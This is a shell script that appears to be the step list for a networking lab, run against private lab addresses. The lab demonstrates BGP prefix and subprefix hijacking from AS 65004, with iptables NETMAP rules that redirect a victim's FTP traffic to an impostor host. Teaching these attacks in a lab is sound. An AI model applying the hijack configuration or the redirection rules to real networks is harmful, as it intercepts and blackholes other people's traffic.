#!/bin/sh

# Task 1
# Remove default routes on asn3 and asn2
sudo ip route del 10.1.1.0/24

# On client
traceroute -n 10.1.1.2
netstat -rn
sudo vtysh -c "show ip route"
# Username: anonymous and random password
# Once connected, type "get README"
ftp 10.1.1.2

# On asn3
sudo vtysh -c "show ip bgp"

# On asn2
sudo vtysh -c "show ip bgp"

# Task 2 prefix hijacking
# On asn4
# Password: test
telnet localhost bgpd

# On telnet session
enable
config terminal
router bgp 65004
network 10.1.0.0/16
end
exit

# On asn4 againg
sudo iptables -t nat -F
sudo iptables -t nat -A PREROUTING -d 10.1.1.2 -m ttl --ttl-gt 1 -j NETMAP --to 10.6.1.2
sudo iptables -t nat -A POSTROUTING -s 10.6.1.2 -j NETMAP --to 10.1.1.2

# On client
traceroute -n 10.1.1.2 
# Username: anonymous and random password
# Once connected, type "get README"
ftp 10.1.1.2

# On asn3
sudo vtysh -c "show ip bgp"

# On asn2
sudo vtysh -c "show ip bgp"

# Task 3 subprefix hijacking
# On asn4
# Password: test
telnet localhost bgpd

# On telnet session
enable
config terminal
router bgp 65004
no network 10.1.0.0/16
network 10.1.1.0/24
end
exit

# On client
traceroute -n 10.1.1.2 
# Username: anonymous and random password
# Once connected, type "get README"
ftp 10.1.1.2

# On asn3
sudo vtysh -c "show ip bgp"

# On asn2
sudo vtysh -c "show ip bgp"
